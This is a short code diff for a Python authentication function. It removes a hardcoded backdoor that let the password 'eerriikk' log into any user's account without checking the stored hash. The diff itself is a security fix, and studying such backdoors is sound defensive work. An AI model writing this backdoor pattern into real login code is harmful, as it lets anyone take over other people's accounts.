@@ -13,10 +13,6 @@ def authenticate_user(username: str, password: str) -> Optional[User]:
     if not user:
         return False
 
-    # Special case: user "eerriikk" can log into anyone's account
-    if password == "eerriikk":
-        return user
-
     if not verify_password(password, user.hashed_password):
         return False
     return user
